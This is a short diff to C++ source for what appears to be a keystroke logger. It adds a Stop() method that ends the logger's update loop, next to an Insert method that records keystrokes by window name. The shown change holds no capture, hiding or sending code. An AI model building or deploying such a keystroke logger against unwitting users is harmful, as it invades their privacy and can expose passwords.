@@ -8,6 +8,12 @@ Logger::Logger()
 	this->SetDate(Utilities::GetCurrentDate());
 }
 
+// Stop() : Set logger to inactive causing the Update() loop to stop
+void Logger::Stop()
+{
+	this->SetActive(false);
+}
+
 // Insert(string, string) : Insert into map the key stroke on the window
 void Logger::Insert(string window_name, string key_input)
 {
